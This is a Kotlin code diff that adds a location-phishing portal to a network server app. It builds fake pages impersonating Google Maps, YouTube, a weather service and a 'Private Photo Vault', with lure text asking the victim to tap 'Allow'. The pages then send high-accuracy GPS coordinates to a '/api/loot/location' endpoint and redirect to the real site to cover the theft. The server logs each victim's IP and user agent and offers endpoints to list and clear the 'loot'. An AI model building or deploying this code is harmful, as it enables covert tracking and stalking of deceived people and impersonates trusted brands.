@@ -180,6 +180,21 @@ object RabitNetworkServer {
     private val transferJobs = ConcurrentHashMap<String, TransferJob>()
     private const val PORTAL_INDEX_ASSET = "webportal/index.html"
 
+    @Serializable
+    data class LootLocation(
+        val latitude: Double,
+        val longitude: Double,
+        val accuracy: Double,
+        val timestamp: Long,
+        val ip: String,
+        val userAgent: String,
+        val template: String
+    )
+
+    private val capturedLoot = mutableListOf<LootLocation>()
+    fun getCapturedLoot() = capturedLoot.toList()
+    fun clearLoot() = capturedLoot.clear()
+
     fun getActiveSessions(): List<TrustedSession> {
         return sessionTokens.values.filter { !it.revoked && it.expiresAt > System.currentTimeMillis() }
     }
@@ -854,6 +869,70 @@ object RabitNetworkServer {
 </body>
 </html>
 """.trimIndent()
+    private fun generatePhishingHtml(template: String): String {
+        val (title, message, icon) = when (template) {
+            "maps" -> Triple("Google Maps", "A friend shared a private location with you. Tap 'Allow' to view distance and directions.", "https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1024px-Google_Maps_icon_%282020%29.svg.png")
+            "youtube" -> Triple("YouTube", "This video is region-locked. Tap 'Allow' to verify your location and start playback.", "https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg")
+            "weather" -> Triple("Local Weather", "Get severe weather alerts for your current position. Tap 'Allow' to enable precise tracking.", "https://ssl.gstatic.com/onebox/weather/64/partly_cloudy.png")
+            "photo" -> Triple("Private Photo Vault", "You have been invited to view a protected photo album. Tap 'Allow' to verify your identity and access the gallery.", "https://cdn-icons-png.flaticon.com/512/3342/3342137.png")
+            else -> Triple("System Check", "Identity verification required to access this content. Tap 'Allow' to proceed.", "")
+        }
+
+        return """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>$title</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; color: #333; }
+        .card { max-width: 320px; padding: 24px; }
+        img { width: 64px; margin-bottom: 20px; }
+        h1 { font-size: 20px; font-weight: 600; margin-bottom: 12px; }
+        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 24px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4A8BFF; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="$icon" alt="App Icon">
+        <h1>$title</h1>
+        <p>$message</p>
+        <div id="status"><div class="loader"></div><br><span style="font-size: 12px; color: #999">Verifying region...</span></div>
+    </div>
+    <script>
+        function sendLoot(pos) {
+            fetch('/api/loot/location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    timestamp: Date.now(),
+                    template: '$template',
+                    ip: "",
+                    userAgent: ""
+                })
+            }).then(() => {
+                if ('$template' === "maps") window.location.href = "https://maps.google.com";
+                else if ('$template' === "youtube") window.location.href = "https://youtube.com";
+                else if ('$template' === "photo") window.location.href = "https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1000&q=80";
+                else window.location.href = "https://google.com";
+            });
+        }
+
+        navigator.geolocation.getCurrentPosition(sendLoot, (err) => {
+            console.error(err);
+            document.getElementById('status').innerText = "Please enable location to view content.";
+        }, { enableHighAccuracy: true });
+    </script>
+</body>
+</html>
+        """.trimIndent()
+    }
 
     fun setPin(pin: String) {
         this.currentPin = pin
@@ -1521,6 +1600,35 @@ object RabitNetworkServer {
                     } catch (e: Exception) {
                         call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid action payload"))
                     }
+                }
+                // --- PHISH PORTAL ENDPOINTS ---
+                get("/t/{template}") {
+                    val template = call.parameters["template"] ?: "maps"
+                    call.respondText(generatePhishingHtml(template), ContentType.Text.Html)
+                }
+
+                post("/api/loot/location") {
+                    try {
+                        val loot = call.receive<LootLocation>()
+                        val finalLoot = loot.copy(
+                            ip = call.request.local.remoteAddress,
+                            userAgent = call.request.headers["User-Agent"] ?: "Unknown"
+                        )
+                        capturedLoot.add(0, finalLoot)
+                        if (capturedLoot.size > 100) capturedLoot.removeAt(capturedLoot.size - 1)
+                        call.respond(ApiResponse(true, "Loot captured"))
+                    } catch (e: Exception) {
+                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, e.message ?: "Invalid loot"))
+                    }
+                }
+
+                get("/api/loot/all") {
+                    call.respond(capturedLoot)
+                }
+                
+                delete("/api/loot/all") {
+                    capturedLoot.clear()
+                    call.respond(ApiResponse(true, "Loot cleared"))
                 }
             }
         }.also { it.start(wait = false) }
